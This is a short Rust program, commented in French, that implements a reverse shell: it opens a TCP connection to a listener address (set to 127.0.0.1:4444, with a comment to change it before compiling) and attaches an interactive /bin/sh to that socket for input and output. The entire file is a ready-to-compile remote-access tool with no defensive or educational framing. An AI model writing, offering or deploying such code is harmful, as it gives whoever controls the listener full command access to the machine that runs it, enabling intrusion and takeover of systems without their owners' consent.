use std::net::TcpStream;
use std::os::fd::FromRawFd;
use std::os::unix::io::IntoRawFd;
use std::process::{Command, Stdio};

fn main() {
    // Adresse du listener — modifier avant compilation
    let addr = "127.0.0.1:4444";

    let stream = TcpStream::connect(addr).expect("Connexion échouée");

    // Duplique le fd pour stdin/stdout/stderr
    let fd = stream.into_raw_fd();

    unsafe {
        Command::new("/bin/sh")
            .arg("-i")
            .stdin(Stdio::from_raw_fd(fd))
            .stdout(Stdio::from_raw_fd(fd))
            .stderr(Stdio::from_raw_fd(fd))
            .spawn()
            .expect("Échec spawn shell")
            .wait()
            .expect("Erreur process");
    }
}
